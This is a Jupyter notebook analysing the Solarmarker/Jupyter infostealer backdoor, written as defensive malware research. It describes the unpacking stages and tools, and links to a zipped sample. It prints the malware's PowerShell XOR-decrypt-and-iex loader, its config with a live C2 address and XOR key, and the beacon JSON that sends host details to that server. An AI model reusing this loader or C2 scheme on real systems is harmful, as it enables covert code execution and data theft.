{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "c38b176a-da33-4d5a-a61f-3bb47967e562",
   "metadata": {},
   "source": [
    "# Jupyter Infostealer\n",
    "> Analysis of Juptyer Infostealer / Solarmarker Backdoor\n",
    "\n",
    "- toc: true \n",
    "- badges: true\n",
    "- categories: [jupyter,mawlare,solarmarker,config,Dot NET]"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b543230b-2585-460e-9f3e-f22f5ccc1e58",
   "metadata": {},
   "source": [
    "# Overview\n",
    "\n",
    "Packed sample: `ee904ce81c66b774897f93b0301e297a9137295516d57ba1c4e078a383cbce39`\n",
    "\n",
    "\n",
    "The sample is too big for Malshare raw but we zipped it and uploaded it, the password is `infected` [Malshare Zip Sample](https://malshare.com/sample.php?action=detail&hash=05a2b5a48fb1622a603ed5b1ad81630a166ff6ee8455f2030d947c73ea6fc925).\n",
    "\n",
    "This is also known by some other names: Jupyter, Polazert, solarmarker, YellowCockatoo\n",
    "\n",
    "**References:**\n",
    "- [Morphisec Blog: Jupyter Infostealer](https://www.morphisec.com/hubfs/eBooks_and_Whitepapers/Jupyter%20Infostealer%20WEB.pdf)\n",
    "- [CrowdStrike: Blocking SolarMarker Backdoor](https://www.crowdstrike.com/blog/solarmarker-backdoor-technical-analysis/)\n",
    "- [Talos: Solarmarker](https://blog.talosintelligence.com/2021/07/threat-spotlight-solarmarker.html)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7338b494-6527-4d21-a6cb-40b761f172ec",
   "metadata": {},
   "source": [
    "## Unpacking Inno - Stage 1\n",
    "\n",
    "### Tools\n",
    "- **Inno Extractor** (`950208c1b7d4d901ca7b942f98214098dc91480cc70af1af12b2291544eb761f`)\n",
    "- **Inno Setup Decompiler** (Pascal Decompiler) (`602e0a4e1efaff739ee308da7fd4c4b5ca3aa6d0640f47ef74b0d445f968301b`)\n",
    "- **DirWatch** (`031e8f61f1501a76015d3add269663172abc648973032dcff4e758effa66b235`)\n",
    "\n",
    "### Behaviour\n",
    "- Inno installer drops and executes a benign file to attempt to look legitimate `Docx2Rtf.exe` (`caf8e546f8c6ce56009d28b96c4c8229561d10a6dd89d12be30fa9021b1ce2f4`)\n",
    "- The Inno compile Pascal script is used for the malicious install\n",
    "- The script drop two `.txt` files in `%TEMP%` with random names\n",
    "- One file is executed 9 times with PowerShell and is used to decrypt and launch the second file, which is also PowerShell\n",
    "\n",
    "### Manual Extraction\n",
    "- Use **Inno Extractor** to extract all files from the Inno installer\n",
    "- Use **Inno Setup Decompiler** to decompile the extracted `CompiledCode.bin` file\n",
    "- Use **DirWatch** to monitor `%temp%` directory with \"auto save\" option eabled\n",
    "- Grab the two `.txt` PowerShell files that were dropped in `%temp%` - These are **Stage 2**\n",
    "\n",
    "The PowerShell code below is used to decrypt the 2nd `.txt` PowerShell file\n",
    "\n",
    "```\n",
    ";\n",
    "$xk=''szikwYdJyBvQLWRAeNXPGaxEObVolScHnrKtqhMpfDjTIUgFuCmZ'';\n",
    "$xb=[System.Convert]::FromBase64String([System.IO.File]::ReadAllText($p));\n",
    "remove-item $p;\n",
    "for($i=0;$i -lt $xb.count;){\n",
    "    for($j=0;$j -lt $xk.length;$j++){\n",
    "        $xb[$i]=$xb[$i] -bxor $xk[$j];\n",
    "        $i++;\n",
    "        if($i -ge $xb.count){$j=$xk.length}\n",
    "     }\n",
    "};\n",
    "$xb=[System.Text.Encoding]::UTF8.GetString($xb);\n",
    "iex $xb;\n",
    "```\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fc974daf-ea5b-4a7e-805c-f59d7d1ae6d2",
   "metadata": {},
   "source": [
    "## Stage 2 - PowerShell Deobfuscation\n",
    "The 2nd stage PowerShell file is Base64 encoded and encrypted with a hard-coded XOR key (found in the first PowerShell script). Once decrypted the script is used to decrypt and reflectivly load a .NET assembly into it's own proccess memory.\n",
    "\n",
    "### Manual Extraction\n",
    "Instead of attempting to maually decode the PowerShell we can take advantage of the fact that it relfectivly loads a .NET assembly to simply dump the assembly out of the process.\n",
    "\n",
    "- Run the malware and watch the process tree with **ProcessHacker**\n",
    "- When the PowerShell process executes suspend it (there are 9, just grab the one that stays running)\n",
    "- Use [**ExtreamDumper**](https://github.com/wwh1004/ExtremeDumper) to dump the .NET assembly out of the PowerShell process\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ea52d4db-779d-48d9-92e3-e8b77b4a1dc0",
   "metadata": {},
   "source": [
    "## Stage 3 - .NET Assembly\n",
    "\n",
    "### Config\n",
    "```\n",
    "ver = \"DR/1.1\";\n",
    "xorkey = \"FVdXLbjs0Rwxsz9CrFh0pSot6Gijigf8t56R\";\n",
    "addr = \"http://91.241.19.21\"\n",
    "```\n",
    "### Hardware ID\n",
    "The hardware ID is stored in `%userprofile%\\\\AppData\\\\Roaming\\\\solarmarker.dat` and is just a random string.\n",
    "\n",
    "### C2 Traffic\n",
    "\n",
    "C2 traffic is encrypted using the xorkey from the hard coded config, then base64 encoded.\n",
    "\n",
    "**Command: `ping`**\n",
    "```\n",
    "{\n",
    "\"action\":\"ping\",\n",
    "\"hwid\":hwid,\n",
    "\"pc_name\":M.GetComputerName(),\n",
    "\"os_name\":M.GetWinVersion(),\n",
    "\"arch\":M.Is64x()?\"x64\":\"x86\",\n",
    "\"rights\":M.IsAdmin()?\"Admin\":\"User\",\n",
    "\"version\":ldrConfig.ver,\n",
    "\"workgroup\":M.GetWorkGroup()|M.WMI(\"win32_computersystem\",\"domain\"),\n",
    "\"dns\":(M.WMI(\"win32_computersystem\",\"partofdomain\").ToLower()==\"false\")?\"0\":\"1\",\n",
    "\"protocol_version\":1\n",
    "}\n",
    "```\n",
    "\n",
    "The C2 can a command via the `status` var in the response json. The status can be either `exe`, `ps1`, or `command`.\n",
    "\n",
    "#### Status: EXE and PS1 \n",
    "The C2 can send down a stage4 payload that is either a PS1 or an EXE. For PS1 they create a file in %TEMP% and execute it with PowerShell just like the Stage 1 loader. If it's an EXE they drop it in the %TEMP% and execute it directly.\n",
    "\n",
    "#### Status: Command\n",
    "The C2 can send a PowerShell command that is directly executed.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2da2df9b-632f-450a-8a02-a98e89918118",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f064638-20ad-401f-9f38-81e3599b0859",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
